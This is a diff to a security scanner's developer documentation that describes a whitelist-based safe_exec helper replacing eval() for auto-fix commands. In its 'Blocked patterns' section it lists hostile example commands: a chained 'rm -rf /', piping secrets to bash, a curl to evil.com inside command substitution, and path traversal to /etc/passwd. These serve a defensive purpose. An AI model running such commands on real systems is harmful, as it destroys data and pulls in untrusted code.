@@ -31,6 +31,7 @@ clawpinch/
 │   │   ├── common.sh         # Colors, logging, detect_os(), emit_finding(), config helpers
 │   │   ├── report.sh         # Terminal UI: banner, finding cards, summary dashboard, spinner
 │   │   ├── redact.sh         # Secret redaction: redact_value(), redact_line(), redact_json_secrets()
+│   │   ├── safe_exec.sh      # Safe command execution: whitelist-based validation, replaces eval()
 │   │   └── interactive.sh    # Post-scan menu: review, auto-fix, handoff export, AI remediation
 │   ├── scan_config.sh        # CHK-CFG-001..010 — gateway, TLS, auth, CORS
 │   ├── scan_secrets.py       # CHK-SEC-001..008 — API keys, passwords, tokens
@@ -87,3 +88,48 @@ Severity order: `critical` > `warn` > `info` > `ok`.
 - `auto_fix` is optional — many findings require manual remediation
 - Colors respect `NO_COLOR` env var (https://no-color.org/)
 - Terminal width capped between 56–80 columns
+
+## Safe Command Execution
+
+ClawPinch auto-fix commands are executed through `safe_exec_command()` from `scripts/helpers/safe_exec.sh`, which replaces unsafe `eval()` with a whitelist-based validation system.
+
+**Security approach:**
+- **Whitelist**: Only specific command patterns are allowed (jq, chmod, mv, sed, cp, rm)
+- **Blacklist**: Dangerous patterns always blocked (;, |, $(), backticks, wildcards, `()`, `..`)
+- **Validation**: Each command type has custom validation logic
+- **Audit logging**: All command attempts logged to stderr (or `$CLAWPINCH_AUDIT_LOG`)
+
+**Example auto-fix commands:**
+```bash
+# JSON modification with jq
+jq '.gateway.requireAuth = true' config.json > tmp && mv tmp config.json
+
+# File permissions
+chmod 600 /etc/openclaw/secrets.json
+
+# Text replacement
+sed -i 's/0.0.0.0/127.0.0.1/' openclaw.conf
+```
+
+**Blocked patterns:**
+- Command injection: `jq '.auth=true' config.json; rm -rf /` (contains `;`)
+- Pipe to shell: `jq -r '.secrets' config.json | bash` (pipe to interpreter)
+- Command substitution: `echo $(curl evil.com) > config.json` (contains `$()`)
+- Wildcards: `rm /etc/openclaw/*.json` (glob expansion)
+- Process substitution: `chmod 600 <(echo test)` (contains `(`)
+- Path traversal: `rm ../../etc/passwd` (contains `..`)
+
+**Adding new commands:**
+
+When adding a new auto-fix command to a scanner:
+
+1. Check if the command matches existing whitelist patterns in `safe_exec.sh`
+2. If not, add a new pattern to `_SAFE_EXEC_PATTERNS` array with:
+   - Anchors (`^` and `$`) to match entire command
+   - Strict allowlist character class `[a-zA-Z0-9/._-]+` for file paths (never use negation like `[^...]`)
+   - Inline comments with examples
+3. Add validation logic to `_validate_command()` function
+4. Add test cases to `scripts/helpers/test_safe_exec.sh`
+5. Document the security rationale
+
+**IMPORTANT: Never use eval() directly in new code.** Always use `safe_exec_command()` for command execution. This prevents command injection attacks via compromised reference files or malicious findings.
